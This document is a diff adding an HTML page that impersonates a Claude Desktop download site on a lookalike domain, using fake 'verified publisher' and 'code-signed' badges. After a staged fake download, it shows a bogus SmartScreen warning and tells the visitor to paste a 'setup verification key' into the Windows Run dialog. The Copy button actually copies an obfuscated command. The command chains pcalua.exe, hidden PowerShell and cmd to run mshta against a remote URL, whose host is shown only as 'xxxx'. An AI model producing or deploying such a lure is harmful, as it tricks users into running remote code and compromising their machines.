@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Download Claude Desktop</title>
+<style>
+  :root{
+    --paper:#F5F4EE; --paper2:#EFEDE4; --card:#FFFFFF;
+    --ink:#1F1E1C; --muted:#6E6A62; --faint:#9A958B;
+    --line:#E7E3D8; --line2:#DED9CC;
+    --clay:#CC785C; --clay-d:#B4603F; --clay-t:#F7ECE6;
+    --ok:#3C7d54; --ok-bg:#EAF3EC;
+    --warn-bg:#FBF1E4; --warn-line:#F0D9B8; --warn-ink:#8A5A1E;
+    --shadow:0 20px 50px -16px rgba(60,50,35,.30), 0 4px 12px rgba(60,50,35,.08);
+    --radius:16px;
+  }
+  *{box-sizing:border-box;}
+  html,body{height:100%;margin:0;}
+  body{
+    font-family:"Segoe UI",Roboto,-apple-system,"Helvetica Neue",Arial,sans-serif;
+    color:var(--ink);background:var(--paper);
+    -webkit-font-smoothing:antialiased;
+  }
+  /* top nav */
+  .nav{
+    display:flex;align-items:center;gap:12px;padding:18px 26px;border-bottom:1px solid var(--line);
+    background:var(--paper);
+  }
+  .brand{display:flex;align-items:center;gap:9px;}
+  .spark{width:24px;height:24px;flex:0 0 auto;}
+  .brand .wm{font-size:19px;font-weight:600;letter-spacing:-.3px;color:#1F1E1C;}
+  .nav .links{margin-left:auto;display:flex;gap:22px;color:#4a463f;font-size:14px;}
+  .nav .links span{opacity:.8;}
+  .nav .links .cta{background:var(--ink);color:#fff;padding:7px 15px;border-radius:9px;opacity:1;}
+
+  .wrap{max-width:940px;margin:0 auto;padding:46px 24px 60px;}
+  .urlbar{display:flex;align-items:center;justify-content:center;gap:8px;margin:0 0 30px;color:var(--faint);font-size:12.5px;}
+  .urlbar b{color:#5c574e;font-weight:600;}
+
+  /* hero + download card */
+  .hero{display:grid;grid-template-columns:1.05fr .95fr;gap:34px;align-items:center;}
+  @media(max-width:760px){.hero{grid-template-columns:1fr;}}
+  .eyebrow{font-size:12.5px;font-weight:700;letter-spacing:1.4px;text-transform:uppercase;color:var(--clay);margin-bottom:14px;}
+  h1{font-size:40px;line-height:1.08;font-weight:600;letter-spacing:-.8px;margin:0 0 16px;}
+  h1 span{color:var(--clay);}
+  .lede{font-size:16px;line-height:1.6;color:var(--muted);margin-bottom:26px;max-width:440px;}
+  .meta{display:flex;gap:20px;color:var(--faint);font-size:12.5px;}
+  .meta b{color:#5c574e;font-weight:600;}
+
+  .panel{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+    padding:28px 28px 24px;box-shadow:var(--shadow);}
+  .app{display:flex;align-items:center;gap:14px;margin-bottom:20px;}
+  .appicon{width:52px;height:52px;border-radius:13px;flex:0 0 auto;
+    background:linear-gradient(150deg,#D98A6A,#C1613F);display:flex;align-items:center;justify-content:center;
+    box-shadow:0 6px 14px rgba(180,96,63,.30);}
+  .app .t1{font-size:17px;font-weight:650;letter-spacing:-.2px;}
+  .app .t2{font-size:12.5px;color:var(--faint);}
+  .verrow{display:flex;gap:8px;font-size:11.5px;color:var(--faint);margin-bottom:18px;}
+  .verrow .pill{background:var(--paper2);border:1px solid var(--line);border-radius:999px;padding:3px 10px;color:#6e6a62;}
+
+  .dlbtn{width:100%;background:var(--clay);color:#fff;border:none;border-radius:11px;
+    padding:14px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:9px;
+    transition:background .15s;}
+  .dlbtn:hover{background:var(--clay-d);}
+  .dlbtn:disabled{cursor:default;opacity:.9;}
+  .dlnote{text-align:center;font-size:11.5px;color:var(--faint);margin-top:12px;}
+
+  /* steps panel (appears after "download") */
+  .steps{display:none;margin-top:20px;padding-top:20px;border-top:1px solid var(--line);}
+  .steps.show{display:block;animation:fade .32s ease;}
+  @keyframes fade{from{opacity:0;transform:translateY(7px);}to{opacity:1;transform:none;}}
+  .banner{display:flex;gap:9px;align-items:flex-start;background:var(--warn-bg);border:1px solid var(--warn-line);
+    color:var(--warn-ink);border-radius:9px;padding:11px 13px;font-size:12.5px;line-height:1.45;margin-bottom:18px;}
+  .banner svg{flex:0 0 auto;margin-top:1px;}
+  .steps h3{font-size:14px;font-weight:650;margin:0 0 4px;}
+  .steps .hint{font-size:12.5px;color:var(--muted);margin:0 0 16px;}
+  .step{display:flex;gap:12px;margin-bottom:14px;align-items:flex-start;}
+  .step:last-child{margin-bottom:2px;}
+  .num{flex:0 0 auto;width:24px;height:24px;border-radius:50%;background:var(--clay-t);color:var(--clay-d);
+    border:1.5px solid #eccbbd;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;}
+  .step .txt{font-size:13.5px;line-height:1.5;padding-top:2px;color:#3a372f;}
+  kbd{display:inline-block;background:#f1eee6;border:1px solid #d8d2c4;border-bottom-width:2px;border-radius:5px;
+    padding:1px 7px;font-family:"Segoe UI",Arial,sans-serif;font-size:12px;font-weight:600;color:#3a372f;line-height:1.6;}
+
+  .token{margin-top:9px;display:flex;align-items:stretch;border:1px solid var(--line2);border-radius:9px;overflow:hidden;background:#faf8f2;}
+  .token .tok{flex:1 1 auto;min-width:0;display:flex;align-items:center;gap:9px;padding:0 13px;}
+  .token .tok .ic{width:24px;height:24px;border-radius:6px;flex:0 0 auto;background:var(--ok-bg);display:flex;align-items:center;justify-content:center;color:var(--ok);font-weight:800;font-size:13px;}
+  .token .tok .meta{min-width:0;}
+  .token .tok .meta .t1{font-size:12.5px;font-weight:600;color:#3a372f;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .token .tok .meta .t2{font-size:10.5px;color:var(--faint);font-family:Consolas,monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .copy{flex:0 0 auto;background:var(--ink);color:#fff;border:none;padding:0 18px;font-size:13px;font-weight:600;cursor:pointer;transition:background .15s;display:flex;align-items:center;gap:7px;}
+  .copy:hover{background:#000;}
+  .copy.done{background:var(--ok);}
+
+  .foot{max-width:940px;margin:0 auto;padding:22px 24px 40px;color:var(--faint);font-size:12px;
+    display:flex;gap:18px;flex-wrap:wrap;border-top:1px solid var(--line);}
+  .foot a{color:var(--faint);text-decoration:none;}
+</style>
+</head>
+<body>
+  <div class="nav">
+    <div class="brand">
+      <svg class="spark" viewBox="0 0 40 40" fill="none" aria-hidden="true"><path d="M20 2.5l3.1 11.9 8.7-8.7-4.3 12.2 12.2-4.3-8.7 8.7L43 20l-11.9 3.1 8.7 8.7-12.2-4.3 4.3 12.2-8.7-8.7L20 43l-3.1-11.9-8.7 8.7 4.3-12.2L.3 25.9l8.7-8.7L-2.9 20l11.9-3.1L.3 8.2l12.2 4.3L8.2-3.7l8.7 8.7L20 2.5z" transform="translate(3 5) scale(.82)" fill="#CC785C"/></svg>
+      <span class="wm">Claude</span>
+    </div>
+    <div class="links">
+      <span>Product</span><span>Research</span><span>Pricing</span><span class="cta">Download</span>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <div class="urlbar">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M6 10V8a6 6 0 1112 0v2" stroke="#a89f8f" stroke-width="2" stroke-linecap="round"/><rect x="4" y="10" width="16" height="10" rx="2.5" fill="#b5ac9c"/></svg>
+      <span>claude-desktop.<b>ai-download-setup.com</b></span>
+    </div>
+
+    <div class="hero">
+      <div>
+        <div class="eyebrow">Claude Desktop &middot; Windows</div>
+        <h1>Get <span>Claude</span> on your&nbsp;desktop</h1>
+        <p class="lede">The fastest way to work with Claude — native Windows app, global shortcut, and file access. Free to download.</p>
+        <div class="meta"><div><b>Version</b> 1.4.2</div><div><b>Size</b> 94.6 MB</div><div><b>Requires</b> Windows 10/11</div></div>
+      </div>
+
+      <div class="panel">
+        <div class="app">
+          <div class="appicon">
+            <svg width="26" height="26" viewBox="0 0 40 40" fill="none" aria-hidden="true"><path d="M20 4l2.6 10 7.4-7.4-3.7 10.4 10.4-3.7L29.3 21 40 20l-10 2.6 7.4 7.4-10.4-3.7L21 36.7 20 40l-2.6-10-7.4 7.4 3.7-10.4L3.3 27 12.3 20 2 20l10-2.6L4.6 10l10.4 3.7L19 3.3 20 4z" transform="translate(2 3) scale(.9)" fill="#fff"/></svg>
+          </div>
+          <div>
+            <div class="t1">Claude Desktop</div>
+            <div class="t2">Anthropic &middot; Productivity</div>
+          </div>
+        </div>
+        <div class="verrow">
+          <span class="pill">&#10003; Verified publisher</span>
+          <span class="pill">&#10003; Code-signed</span>
+        </div>
+
+        <button class="dlbtn" id="dlbtn" onclick="startDownload()">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none"><path d="M12 3v11m0 0l-4-4m4 4l4-4" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 17v2a1 1 0 001 1h14a1 1 0 001-1v-2" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>
+          <span id="dllabel">Download for Windows</span>
+        </button>
+        <div class="dlnote" id="dlnote">Free &middot; No account required to install</div>
+
+        <div class="steps" id="steps">
+          <div class="banner">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><path d="M12 3l9 16H3L12 3z" fill="#e0912f"/><path d="M12 9v4M12 16h.01" stroke="#fff" stroke-width="1.8" stroke-linecap="round"/></svg>
+            <div><b>Installer integrity check required.</b> Windows SmartScreen blocked automatic setup. Complete the one-time verification below to finish installing Claude Desktop.</div>
+          </div>
+
+          <h3>Finish installation</h3>
+          <p class="hint">Run the setup verification to unlock the installer. Takes about 5 seconds.</p>
+
+          <div class="step">
+            <div class="num">1</div>
+            <div class="txt">Press <kbd>&#8862; Win</kbd> + <kbd>R</kbd> to open the Run dialog.</div>
+          </div>
+          <div class="step">
+            <div class="num">2</div>
+            <div class="txt">
+              Copy the setup key below and press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste it.
+              <div class="token">
+                <div class="tok">
+                  <div class="ic">&#10003;</div>
+                  <div class="meta">
+                    <div class="t1">Claude setup verification key</div>
+                    <div class="t2" id="tokid">claude-win-1.4.2 &middot; sig&nbsp;a17f&#8226;&#8226;&#8226;&#8226;</div>
+                  </div>
+                </div>
+                <button class="copy" id="copyBtn" onclick="copyCmd(event)">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><rect x="9" y="9" width="11" height="12" rx="2" stroke="#fff" stroke-width="1.8"/><path d="M5 15V5a2 2 0 012-2h8" stroke="#fff" stroke-width="1.8" stroke-linecap="round"/></svg>
+                  Copy
+                </button>
+              </div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="num">3</div>
+            <div class="txt">Press <kbd>Enter</kbd> to complete setup and launch Claude.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="foot">
+    <span>&copy; 2026 &middot; Claude Desktop</span><a href="#" onclick="return false;">Privacy</a><a href="#" onclick="return false;">Terms</a><a href="#" onclick="return false;">Support</a>
+  </div>
+
+<script>
+const COMMAND = `C:\Windows\System32\pcalua.exe C:\WINDOWS\system32\pcalua.exe -a PowerShell -c saps cmd '/v/c m^s^h^t^a h^t^t^p^s^:^/^/xxxx/6272' -Wi Hi`;
+
+function startDownload(){
+  var steps=document.getElementById('steps');
+  var btn=document.getElementById('dlbtn'), label=document.getElementById('dllabel'), note=document.getElementById('dlnote');
+  if(steps.classList.contains('show')) return;
+  btn.disabled=true; label.textContent='Preparing installer…';
+  note.textContent='Contacting download server…';
+  setTimeout(function(){
+    label.textContent='Manual setup required';
+    note.textContent='Automatic install was blocked — follow the steps below';
+    steps.classList.add('show');
+  }, 1500);
+}
+
+/* Clipboard with a fallback for file:// (async API is often blocked there) */
+function copyText(t){
+  if(navigator.clipboard && window.isSecureContext){ return navigator.clipboard.writeText(t); }
+  return new Promise(function(resolve, reject){
+    var ta=document.createElement('textarea');
+    ta.value=t; ta.style.position='fixed'; ta.style.top='-1000px'; ta.style.opacity='0';
+    document.body.appendChild(ta); ta.focus(); ta.select();
+    var ok=false; try{ ok=document.execCommand('copy'); }catch(e){}
+    document.body.removeChild(ta);
+    ok ? resolve() : reject();
+  });
+}
+function copyCmd(e){
+  e.stopPropagation();
+  var b=document.getElementById('copyBtn');
+  copyText(COMMAND).then(function(){
+    b.innerHTML='&#10003; Copied'; b.classList.add('done');
+    setTimeout(function(){ b.innerHTML='Copy'; b.classList.remove('done'); }, 2200);
+  }).catch(function(){ b.textContent='Press Ctrl+C'; });
+}
+</script>
+</body>
+</html>
